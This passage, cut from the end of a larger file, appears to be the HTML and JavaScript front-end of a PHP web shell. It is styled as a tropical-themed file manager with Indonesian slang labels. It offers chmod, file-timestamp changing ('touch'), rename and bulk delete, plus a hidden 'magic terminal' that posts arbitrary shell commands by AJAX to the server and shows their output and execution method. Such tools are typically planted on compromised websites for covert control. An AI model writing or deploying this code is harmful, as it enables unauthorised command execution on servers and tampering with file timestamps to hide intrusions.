<button type="submit" name="__chmod__" value="1" class="tropical-btn btn-palm" style="flex: 2;">Apply</button>
<button type="button" class="tropical-btn btn-sand" style="flex: 1;" onclick="hideModal('chmodModal')">Cancel</button>
</div>
</form>
</div>
</div>
<!-- Touch Modal -->
<div class="tropical-modal" id="touchModal">
<div class="modal-content">
<h3 style="color: var(--ocean-dark); margin-bottom: 20px;">📅 Change Time</h3>
<form method="post">
<input type="hidden" name="__touch_file__" id="touchFileName">
<input type="datetime-local" name="__timestamp__" id="touchValue" class="tropical-input" required>
<div style="display: flex; gap: 15px; margin-top: 25px;">
<button type="submit" name="__touch__" value="1" class="tropical-btn btn-palm" style="flex: 2;">Apply</button>
<button type="button" class="tropical-btn btn-sand" style="flex: 1;" onclick="hideModal('touchModal')">Cancel</button>
</div>
</form>
</div>
</div>
<!-- Rename Modal -->
<div class="tropical-modal" id="renameModal">
<div class="modal-content">
<h3 style="color: var(--ocean-dark); margin-bottom: 20px;">✏️ Rename</h3>
<form method="post">
<input type="hidden" name="__rename_old__" id="renameOldName">
<input type="text" name="__rename_new__" id="renameNewName" class="tropical-input" placeholder="New name" required>
<div style="display: flex; gap: 15px; margin-top: 25px;">
<button type="submit" name="__rename__" value="1" class="tropical-btn btn-palm" style="flex: 2;">Rename</button>
<button type="button" class="tropical-btn btn-sand" style="flex: 1;" onclick="hideModal('renameModal')">Cancel</button>
</div>
</form>
</div>
</div>
<!-- Delete Modal -->
<div class="tropical-modal" id="deleteModal">
<div class="modal-content">
<h3 style="color: var(--coral-dark); margin-bottom: 20px;">🗑 Confirm Delete</h3>
<p style="margin-bottom: 20px;">uda betul itu mau kau hapus??</p>
<form method="post" id="deleteForm">
<div id="selectedItemsContainer"></div>
<div style="display: flex; gap: 15px;">
<button type="submit" name="__delete_selected__" value="1" class="tropical-btn btn-coral" style="flex: 2;">betullaah</button>
<button type="button" class="tropical-btn btn-sand" style="flex: 1;" onclick="hideModal('deleteModal')">gak jadi laa</button>
</div>
</form>
</div>
</div>
<script>
function showModal(id) {
document.getElementById(id).style.display = 'flex';
}
function hideModal(id) {
document.getElementById(id).style.display = 'none';
}
function showCreateModal() {
showModal('createModal');
document.querySelector('#createModal input[name="__name__"]').focus();
}
function showDeleteModal() {
const checkboxes = document.querySelectorAll('.file-checkbox:checked');
if (checkboxes.length === 0) {
alert('Please select items to delete');
return;
}
const container = document.getElementById('selectedItemsContainer');
container.innerHTML = '';
checkboxes.forEach(cb => {
const input = document.createElement('input');
input.type = 'hidden';
input.name = 'selected_items[]';
input.value = cb.value;
container.appendChild(input);
});
showModal('deleteModal');
}
function showChmodModal(filename, currentPerm) {
document.getElementById('chmodFileName').value = filename;
document.getElementById('chmodValue').value = currentPerm;
showModal('chmodModal');
document.getElementById('chmodValue').focus();
}
function showTouchModal(filename) {
document.getElementById('touchFileName').value = filename;
const now = new Date();
const year = now.getFullYear();
const month = String(now.getMonth() + 1).padStart(2, '0');
const day = String(now.getDate()).padStart(2, '0');
const hours = String(now.getHours()).padStart(2, '0');
const minutes = String(now.getMinutes()).padStart(2, '0');
document.getElementById('touchValue').value = `${year}-${month}-${day}T${hours}:${minutes}`;
showModal('touchModal');
}
function showRenameModal(filename) {
document.getElementById('renameOldName').value = filename;
document.getElementById('renameNewName').value = filename;
showModal('renameModal');
document.getElementById('renameNewName').focus();
document.getElementById('renameNewName').select();
}
function openDirectLink(encodedFile) {
const currentPath = '<?php echo $__dir__; ?>';
const filePath = currentPath + decodeURIComponent(encodedFile);
let relativePath = filePath;
const docRoot = '<?php echo $_SERVER['DOCUMENT_ROOT'] ?? ''; ?>';
if (docRoot && filePath.startsWith(docRoot)) {
relativePath = filePath.substring(docRoot.length);
} else {
const scriptDir = '<?php echo dirname($_SERVER['PHP_SELF']); ?>';
const currentDir = '<?php echo $__dir__; ?>';
if (currentDir.includes(scriptDir)) {
relativePath = currentDir.replace(scriptDir, '') + decodeURIComponent(encodedFile);
} else {
relativePath = '/' + decodeURIComponent(encodedFile);
}
}
if (!relativePath.startsWith('/')) {
relativePath = '/' + relativePath;
}
const fullUrl = window.location.origin + relativePath;
window.open(fullUrl, '_blank');
}
document.getElementById('selectAll')?.addEventListener('change', function(e) {
document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = e.target.checked);
});
document.addEventListener('keydown', function(e) {
if (e.key === 'Escape') {
hideModal('createModal');
hideModal('chmodModal');
hideModal('touchModal');
hideModal('renameModal');
hideModal('deleteModal');
}
});
document.querySelectorAll('.tropical-modal').forEach(modal => {
modal.addEventListener('click', function(e) {
if (e.target === this) hideModal(this.id);
});
});
// Fungsi untuk membuka/tutup terminal
function toggleMagicTerminal() {
const terminal = document.getElementById('magic-terminal');
const btn = document.getElementById('magic-terminal-btn');
if (terminal.style.display === 'none' || terminal.style.display === '') {
terminal.style.display = 'block';
btn.style.transform = 'scale(1.2) rotate(180deg)';
} else {
terminal.style.display = 'none';
btn.style.transform = 'scale(1) rotate(0deg)';
}
}
// Fungsi untuk mengisi command dari tombol cepat
function setCommand(cmd) {
document.getElementById('magic-cmd-input').value = cmd;
}
// Handle form submit dengan AJAX (biar gak reload)
document.getElementById('magic-terminal-form')?.addEventListener('submit', function(e) {
e.preventDefault();
const cmd = document.getElementById('magic-cmd-input').value.trim();
if (!cmd) return;
const path = '<?php echo addslashes($__dir__); ?>';
const outputDiv = document.getElementById('magic-terminal-output');
outputDiv.innerHTML = '<div style="color: #ff4646; text-align: center;">⚡ Menjalankan perintah...</div>';
fetch(window.location.href, {
method: 'POST',
headers: {
'Content-Type': 'application/x-www-form-urlencoded',
},
body: 'ajax=1&cmd=' + encodeURIComponent(cmd) + '&path=' + encodeURIComponent(path)
})
.then(response => response.json())
.then(data => {
if (data.error) {
outputDiv.innerHTML = '<div style="color: #ff4646;">Error: ' + data.error + '</div>';
return;
}
const statusColor = data.status.includes('SUCCESS') ? '#00ff00' : '#ff4646';
outputDiv.innerHTML = `
<div style="margin-top: 15px;">
<div style="display: flex; gap: 10px; margin-bottom: 5px;">
<span style="color: ${statusColor};">${data.status}</span>
<span style="color: #ffa500;">⚡ Metode: ${data.method}</span>
</div>
<pre>${escapeHtml(data.output)}</pre>
</div>
`;
document.getElementById('magic-cmd-input').value = '';
})
.catch(error => {
outputDiv.innerHTML = '<div style="color: #ff4646;">Error: ' + error + '</div>';
});
});
function escapeHtml(unsafe) {
return unsafe
.replace(/&/g, "&amp;")
.replace(/</g, "&lt;")
.replace(/>/g, "&gt;")
.replace(/"/g, "&quot;")
.replace(/'/g, "&#039;");
}
</script>
</body>
</html>
